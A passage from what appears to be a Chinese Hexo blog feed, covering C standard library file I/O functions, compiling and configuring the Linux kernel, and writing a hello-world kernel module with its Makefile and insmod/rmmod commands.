href="#C-库操作" class="headerlink" title="C 库操作"></a>C 库操作</h5><h6 id="1-创建和打开"><a href="#1-创建和打开" class="headerlink" title="1.  创建和打开"></a>1.  创建和打开</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span>;</span><br></pre></td></tr></table></figure><p>mode 取值:</p><table><thead><tr><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>r, rb</td><td>以只读方式打开</td></tr><tr><td>w, wb</td><td>以只写方式打开, 文件不存在，则创建文件，否则文件被截断</td></tr><tr><td>a, ab</td><td>以追加方式打开，如果文件不存在，则创建文件</td></tr><tr><td>r+, r+b , rb+</td><td>以读写方式打开</td></tr><tr><td>w+, w+b, wh+</td><td>以读写方式打开，如果文件不存在和创建文件，否则文件被截断</td></tr><tr><td>a+, a+b, ab+</td><td>以读和追加方式打开，如果文件不存在，则创建新文件</td></tr></tbody></table><p>b 用于 <strong>区分二进制文件和文本文件， DOS,window系统有区分, Linux 系统并不区分二进制文件和文本文件</strong></p><h6 id="2-读写-字符，字符串为单位"><a href="#2-读写-字符，字符串为单位" class="headerlink" title="2.  读写: 字符，字符串为单位"></a>2.  读写: 字符，字符串为单位</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">fgetc</span><span class="params">(FILE *stream)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">fputc</span><span class="params">(<span class="keyword">int</span> c, FILE *stream)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n, FILE *stream)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputs</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, FILE *stream)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fscanf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="keyword">size_t</span> fread(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> n, FILE *stream);</span><br><span class="line"><span class="keyword">size_t</span> fwrite(<span class="keyword">const</span> <span class="keyword">void</span> *prt, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> n, FILE *stream);</span><br></pre></td></tr></table></figure><h6 id="3-C库提供读写过程中定位能力"><a href="#3-C库提供读写过程中定位能力" class="headerlink" title="3.  C库提供读写过程中定位能力:"></a>3.  C库提供读写过程中定位能力:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fgetpos</span><span class="params">(FILE* stream, <span class="keyword">fpos_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsetpos</span><span class="params">(FILE* stream, <span class="keyword">const</span> <span class="keyword">fpos_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fseek</span><span class="params">(FILE* stream, <span class="keyword">long</span> offset, <span class="keyword">int</span> whence)</span></span>;</span><br></pre></td></tr></table></figure><h6 id="4-关闭"><a href="#4-关闭" class="headerlink" title="4.  关闭:"></a>4.  关闭:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure><h6 id="5-定位"><a href="#5-定位" class="headerlink" title="5. 定位:"></a>5. 定位:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fseek</span><span class="params">(FILE* stream, <span class="keyword">long</span> offset, <span class="keyword">int</span> whence)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="补充"><a href="#补充" class="headerlink" title="补充:"></a>补充:</h5><h6 id="1-类型转换-FILE-与-int-fd-转换"><a href="#1-类型转换-FILE-与-int-fd-转换" class="headerlink" title="1. 类型转换:    FILE*  与 int  fd 转换:"></a>1. 类型转换:    FILE*  与 int  fd 转换:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fileno</span><span class="params">(FILE* stream)</span></span>;  <span class="comment">// FILE* --&gt; int</span></span><br><span class="line"><span class="function">FILE* <span class="title">fdopen</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *mode)</span></span>; <span class="comment">// int --&gt; FILE*</span></span><br></pre></td></tr></table></figure><h6 id="2-rewind"><a href="#2-rewind" class="headerlink" title="2. rewind:"></a>2. rewind:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rewind</span><span class="params">(FILE* stream)</span></span></span><br></pre></td></tr></table></figure><p>​        从新将文件指针指向文件开头, 同时清除和文件流相关的错误和EOF标记, 等价于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fseek(stream, <span class="number">0</span>, SEEK_SET);</span><br></pre></td></tr></table></figure><h6 id="3-ftell"><a href="#3-ftell" class="headerlink" title="3. ftell:"></a>3. ftell:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span>  <span class="title">ftell</span><span class="params">(FILE* steram)</span></span>;</span><br></pre></td></tr></table></figure><p>​         得到文件读写指针当前位置偏离文件头的偏移字节 等价于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fseek(stream, <span class="number">0</span>, SEEK_CUR);</span><br></pre></td></tr></table></figure><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>编译Linux内核</title>
      <link href="/2017/09/10/kernel/%E7%BC%96%E8%AF%91Linux%E5%86%85%E6%A0%B8/"/>
      <url>/2017/09/10/kernel/%E7%BC%96%E8%AF%91Linux%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><blockquote><p>  Linux内核是操作系统的核心，也是操作系统最基本的部分。</p><p>  Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。<br><strong>注意: 如果两个内核模块的版本不完全相同是不可以跨版本使用的。</strong></p></blockquote><a id="more"></a><p><br></p><h5 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h5><ol><li><p>获取内核源码， 并进行解压    <a href="https://www.kernel.org/" target="_blank" rel="noopener">内核下载</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf linux-xxx.tar.gz</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>配置内核特性(选择一种方法就可以了)</p><ol><li><p>现有编译选项:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">make config：遍历选择所要编译的内核特性</span><br><span class="line">make allyesconfig：配置所有可编译的内核特性</span><br><span class="line">make allnoconfig：并不是所有的都不编译</span><br><span class="line">make menuconfig：这种就是打开一个文件窗口选择菜单</span><br><span class="line">make kconfig(KDE桌面环境下，并且安装了qt开发环境)</span><br><span class="line">make gconfig(Gnome桌面环境，并且安装gtk开发环境)</span><br></pre></td></tr></table></figure></li><li><p>内核模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] 64-bit kernel        # 64bit 支持</span><br><span class="line">    General setup ---&gt;      # 基本设置</span><br><span class="line">[*] Enable loadable module support ---&gt;         # 模块加载支持</span><br><span class="line">-*- Enable the block layer ---&gt;                 # 块设备层支持</span><br><span class="line">    Processor type and features ---&gt;            # 处理器类型和特性选择</span><br><span class="line">    Power management and ACPI options ---&gt;      # 电源管理功能</span><br><span class="line">    Bus options (PCI etc.) ---&gt;                 # 总线选项</span><br><span class="line">    Executable file formats / Emulations ---&gt;   # 可执行文件格式</span><br><span class="line">-*- Networking support ---&gt;                     # 网络支持</span><br><span class="line">    Device Drivers ---&gt;                         # 设备驱动</span><br><span class="line">    Firmware Drivers ---&gt;# 固件驱动</span><br><span class="line">    File systems ---&gt;# 文件系统</span><br><span class="line">    Kernel hacking ---&gt;    # 内核技巧</span><br><span class="line">    Security options ---&gt;# 安全选项</span><br><span class="line">-*- Cryptographic API ---&gt;# 密码相关API</span><br><span class="line">[*] Virtualization ---&gt;    # 虚拟化</span><br><span class="line">    Library routines ---&gt;# 函式库</span><br></pre></td></tr></table></figure></li><li><p>基本设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[ ] Prompt for development and/or incomplete code/drivers</span><br><span class="line">    # 尚未完成开发的代码或驱动，求稳不选</span><br><span class="line">    </span><br><span class="line">( ) Cross-compliler tool prefix</span><br><span class="line">    # 交叉编译前缀，用不到不选</span><br><span class="line">    </span><br><span class="line">( ) Local version - append to kernel release</span><br><span class="line">[ ] Automatically append version infomation to the version string</span><br><span class="line">    # 以上两项用于自定义内核的版本描述，无意义不设</span><br><span class="line">    </span><br><span class="line">    Kernel compression mode (XZ) ---&gt;</span><br><span class="line">    # 内核压缩算法，有 Gzip,Bzip2,LZMA,XZ,LZO 几个选项</span><br><span class="line">    # 选择了较新的 XZ ，有较高的压缩比和解压缩速度</span><br><span class="line"></span><br><span class="line">( ) Default hostname</span><br><span class="line">    # 用户未设置 hostname 时的默认值，无意义不设  </span><br><span class="line"></span><br><span class="line">[*] Support for paging of anonymous memory (swap)</span><br><span class="line">    # swap 虚拟内存支持，必选</span><br><span class="line"></span><br><span class="line">[*] System V IPC</span><br><span class="line">    # 进程间通信，必选</span><br><span class="line"></span><br><span class="line">[ ] Open by fhandle syscalls</span><br><span class="line">    # 支持通过文件句柄的系统调用，开发文件系统时可能用到，一般用户可不选       </span><br><span class="line"></span><br><span class="line">[ ] Auditing support</span><br><span class="line">    [ ] Enable system-call auditing support</span><br><span class="line">    [ ] Make audit loginuid immutable</span><br><span class="line">    # 审计支持，安装 SELinux 必选，但会拖慢系统，一般用户可不选  </span><br><span class="line"></span><br><span class="line">IRQ Subsystem ---&gt;</span><br><span class="line"># 中断请求子系统，64位系统下面木有选项，免选了</span><br><span class="line"></span><br><span class="line">Timers Subsystem ---&gt;</span><br><span class="line">    [*] Tickless System (Dynamic Ticks)</span><br><span class="line">    # 计时子系统，Tickless系统可降能耗，选上</span><br><span class="line">    [ ] High Resolution Timer Support</span><br><span class="line">    # 高精度计时器需要硬件支持，一般硬件不支持，不选</span><br><span class="line"></span><br><span class="line">CPU/Task time and stats accounting ---&gt;</span><br><span class="line">    Cputime accounting (Simple tick based cputime accounting) ---&gt;</span><br><span class="line">        (X) Simple tick based cputime accounting</span><br><span class="line">        ( ) Fine granularity task level IRQ time accounting</span><br><span class="line">    # 统计进程占用CPU时间的方式，这里选择 Simple tick 方式</span><br><span class="line">    [*] BSD Process Accounting</span><br><span class="line">    # 将进程的统计信息写入文件，支持用户级系统调用，必选</span><br><span class="line">        [*] BSD Process Accounting version 3 file format</span><br><span class="line">        # 使用第三版文件格式，不兼容老版本，淘汰老文件格式，选了</span><br><span class="line">        [ ] Export task/process statistics through netlink (EXPERIMENTAL)</span><br><span class="line">        # 通过netlink接口向用户空间导出统计信息，可不选   </span><br><span class="line">        [ ] Enable per-task delay accounting (EXPERIMENTAL)</span><br><span class="line">        # 在统计信息中包含进程等待资源所花费的时间，可不选</span><br><span class="line">        [ ] Enable extended accounting over taskstats (EXPERIMENTAL)</span><br><span class="line">            [ ] Enable pre-task storage I/O accounting (EXPERIMENTAL)</span><br><span class="line">            # 在统计信息中包含额外的信息，可不选</span><br></pre></td></tr></table></figure><p>​</p></li></ol></li><li><p>编译内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make -j  x     // x号最多为CPU物理核心总数的两倍，这样会快点哦   </span><br><span class="line">make headers   // 很多Makefile 不在支持</span><br><span class="line">make modules</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>安装内核模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make header_install    //可忽略</span><br><span class="line">make modules_install</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>安装内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install   #会自动更新grub.conf 文件 若失败  update-grub2 手动执行，并查看文件是否更新</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>验证并测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /boot/grub/grub.conf</span><br><span class="line">查看新内核是否已经添加, 而后重启系统并测试</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>清理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make mrproper命令会删除所有的编译生成文件、内核配置文件(.config文件)和各种备份文件，所以几乎只在第一次执行内核编译前才用这条命令。  #重新配置make menuconfig 之前运行</span><br><span class="line">make clean命令则是用于删除大多数的编译生成文件，但是会保留内核的配置文件.config，还有足够的编译支持来建立扩展模块。所以你若只想删除前一次编译过程的残留数据，只需执行make clean命令。</span><br><span class="line"></span><br><span class="line">执行make mrproper 之前 会先调用 make clean;</span><br></pre></td></tr></table></figure><p>​</p><p>​</p></li></ol><h5 id="单内核-微内核"><a href="#单内核-微内核" class="headerlink" title="单内核, 微内核:"></a>单内核, 微内核:</h5><ul><li>单内核(宏内核):   <ul><li>单内核将操作系统从整体作为一个单独的大过程来实现，同时也运行在一个单独的地址空间上。这样的内核通常以单个静态二进制文件的形式存放于磁盘中。</li><li>各个进程，模块都运行在内核态，并处于同一地址空间:  内核可以直接调用</li></ul></li><li>微内核:<ul><li>微内核的功能被划分为多个独立过程，每个过程叫做一个服务器</li><li>只有强烈请求特权服务的服务器才运行在特权模式下，其他服务运行在用户空间</li><li>所有服务都保持独立并运行在各自的地址空间中( 通过 消息传递处理微内核通讯  IPC机制等)</li><li>IPC机制开销多余函数调用，且涉及内核空间和用户空间的上下文切换</li></ul></li><li>Linux内核是单内核:(Linux内核运行在单独的内核地址空间上)<ul><li>Linux引用模块化设计，抢占式内核，支持内核线程以及动态装载内核模块</li><li>很多服务运行在内核态，即避免IPC调用，直接采用函数调用</li></ul></li></ul><p>​    </p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内核模块hello_module介绍</title>
      <link href="/2017/09/08/kernel/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97-hello-module%E4%BB%8B%E7%BB%8D/"/>
      <url>/2017/09/08/kernel/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97-hello-module%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h5 id="Linux内核结构"><a href="#Linux内核结构" class="headerlink" title="Linux内核结构:"></a>Linux内核结构:</h5><ul><li><p>Device Drivers 设备驱动</p><ul><li>Linux 内核中大量代码在设备驱动程序部分，用于控制特定的硬件设备</li><li>Linux 驱动一般分为网络设备， 块设备， 字符设备， 杂项设备</li></ul></li><li><p>网络协议栈</p><ul><li>内核网络协议栈为Linux提供了丰富的网络协议实现</li></ul><p>​</p></li></ul><a id="more"></a><p><br></p><h5 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.    准备工作"></a>1.    准备工作</h5><ol><li><p>Debian: 编译内核模块的准备  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install module-assistant  #获取模块助手</span><br></pre></td></tr></table></figure></li><li><p>Fedora: kernel-dedel 包包含了编译Fedora内核模块的所有必要文档和工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install kernel-devel</span><br></pre></td></tr></table></figure></li><li><p>内核源码下载:</p><p><a href="http://kernel.org" target="_blank" rel="noopener">http://kernel.org</a></p><p>将内核放置到非超级用户目录下：  尽量少用sudo 等提权命令</p><ol><li><p>cd linux-&lt;version&gt;<br>make menuconfig   生成    .config 规则文件<br><img src="/img/kernel/2017-09-07_150323.png" alt="make menuconfig"></p><p> ​</p></li><li><p>make help  帮助文档</p><ul><li><p>Configuration targets:</p><p>​  menuconfig      - Update current config utilising a menu based program<br>​     oldconfig      - Update current config utilising a provided .config as base</p></li><li><p>Other generic targets:</p><p>​  all      - Build all targets marked with [*]<br>​  vmlinux  - Build the bare kernel<br>​  modules  - Build all modules</p></li><li><p>Kernel packaging:</p><p>​    rpm-pkg             - Build both source and binary RPM kernel packages<br>​    binrpm-pkg          - Build only the binary kernel RPM package<br>​    deb-pkg             - Build both source and binary deb kernel packages<br>​    bindeb-pkg          - Build only the binary kernel deb package<br>​    tar-pkg             - Build the kernel as an uncompressed tarball<br>​    targz-pkg           - Build the kernel as a gzip compressed tarball<br>​    tarbz2-pkg          - Build the kernel as a bzip2 compressed tarball<br>​    tarxz-pkg           - Build the kernel as a xz compressed tarball</p></li><li><p>Linux kernel internal documentation in different formats (DocBook):</p><p>​    htmldocs        - HTML<br>​    pdfdocs         - PDF<br>​    psdocs          - Postscript<br>​    xmldocs         - XML DocBook<br>​    mandocs         - man pages<br>​    installmandocs  - install man pages generated by mandocs to INSTALL_MAN_PATH </p><p>​    (default: ./usr) </p><p>​    cleandocs       - clean all generated DocBook files</p></li></ul></li><li><p>sudo tar -C / -xvf linux-&lt;version&gt;.tar 安装内核   /  make modules_install / make install </p><p>​</p></li></ol></li><li><p>内核配置:</p><ul><li>使用menuconfig      #make menuconfig   生成.config配置文件</li></ul></li></ol><p><br></p><h5 id="2-驱动模块编程"><a href="#2-驱动模块编程" class="headerlink" title="2.    驱动模块编程:"></a>2.    驱动模块编程:</h5><blockquote><p>​      printk相当于printf的孪生姐妹，她们一个运行在用户态，另一个则在内核态被人们所熟知。但是根据不同的操作系统也会有不一样的效果，例如编写一个hello word 内核模块，使用这个函数不一定会将内容显示到终端上，但是一定在内核缓冲区里，可以使用dmesg.查看效果。</p></blockquote><p>hello内核模块功能:</p><blockquote><p>​    printk  在内核中打印信息</p><p>​                   输出到内核的消息缓存kernel Message buffer 并拷贝到 /var/log/message中</p></blockquote><p>/var/log/syslog<br><img src="/img/kernel/2017-09-07_102910.png" alt="syslog"></p><p>/var/log/kern.log<br><img src="/img/kernel/2017-09-07_103150.png" alt="kern.log"></p><ul><li><p><a href="http://pan.baidu.com/s/1o8r6m6I" target="_blank" rel="noopener">hello_module 模块下载</a></p></li><li><p>编写Hello Module必要头文件:  </p><p>&lt;linux/module.h&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODELE_LICENSE(_license) 遵循开放协议 GPL</span><br><span class="line">MODULE_AUTHOR(_author)   代码作者</span><br></pre></td></tr></table></figure><p>&lt;linux/init.h&gt; 包含初始化宏定义的头文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_init(x)  </span><br><span class="line">module_exit(x)</span><br></pre></td></tr></table></figure></li><li><p>模块编写:</p><ul><li><p>hello_printk.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;   // 模块加载;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; // GPL协议</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line"><span class="comment">//可无;</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">"Rocky_Ansi"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// __init关键字告诉内核这个代码只会被运行一次，而且是在内核装载的时候。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">printk(KERN_WARNING <span class="string">"Welcome hello-module init\n"</span>);        </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// __exit关键字告诉内核这段代码只在内核模块被卸载的时候运行一次.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;        </span><br><span class="line">printk(KERN_WARNING <span class="string">"Byebye hello-module exit\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>Makefile:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#obj-m指出将要编译成的内核模块列表。.o格式文件会自动地有相应的.c文件生成</span></span><br><span class="line"><span class="comment">#y  build directly into the kernel</span></span><br><span class="line"><span class="comment">#n  leave entirely out of the kernel</span></span><br><span class="line"><span class="comment">#m  Build as a module, to be loaded if needed.</span></span><br><span class="line"><span class="comment">#?  print a bried descriptive message and repeat the prompt.</span></span><br><span class="line">obj-m +=  hello.o</span><br><span class="line"></span><br><span class="line"><span class="comment">#CFLAGS += /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0/include </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#KDIR表示是内核源代码的位置。 链接到包含着正在使用内核对应源代码的目录树位置。</span></span><br><span class="line">KDIR := /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#PWD指示了当前工作目录并且是我们自己内核模块的源代码位置</span></span><br><span class="line">PWD ?= <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#M= 指定hello.c Makefile所在目录 </span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C <span class="variable">$(KDIR)</span> <span class="variable">$(CFLAGS)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -rf *.o</span><br></pre></td></tr></table></figure><ul><li><p>编译流程:<br> <img src="/img/kernel/kernel_编译流程.png" alt="编译流程"></p><ul><li>第一条红线:  进入Linux源码中，调用版本信息 以及 一些头文件。<br>  整个Linux的源码文件</li><li>第二条橙线:  搜索完Linux源码树的信息之后,Makefile继续运行，调用编译.KO 文件的源码文件。<br>  hello_module.c 文件。</li></ul></li></ul></li></ul></li></ul><p><br></p><h5 id="3-生成ko模块"><a href="#3-生成ko模块" class="headerlink" title="3. 生成ko模块"></a>3. 生成ko模块</h5><p>make  #发现缺失 &lt;bound.h&gt; 等头文件<br>解决:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kernel-&amp;lt;version&amp;gt;</span><br><span class="line">sudo make oldconfig &amp;&amp; sudo  make prepare   // 产生缺失的必须模块文件</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="4-挂载-移除，-查看ko模块信息"><a href="#4-挂载-移除，-查看ko模块信息" class="headerlink" title="4. 挂载, 移除， 查看ko模块信息;"></a>4. 挂载, 移除， 查看ko模块信息;</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insmod 加载模块</span><br><span class="line">    dmesg |grep hello  -- 可以查看模块输出到内核信息；</span><br><span class="line">lsmod  查看模块</span><br><span class="line">rmmod  卸载模块命令</span><br></pre></td></tr></table></figure><p><br></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-kernel-logging-apis/index.html" target="_blank" rel="noopener">printk函数 - IBM</a></p><p><a href="https://coolshell.cn/articles/566.html" target="_blank" rel="noopener">陈皓 - 内核模块</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Expect 自动化运维</title>
      <link href="/2017/08/27/yunwei/Expect-%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4/"/>
      <url>/2017/08/27/yunwei/Expect-%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4/</url>
      
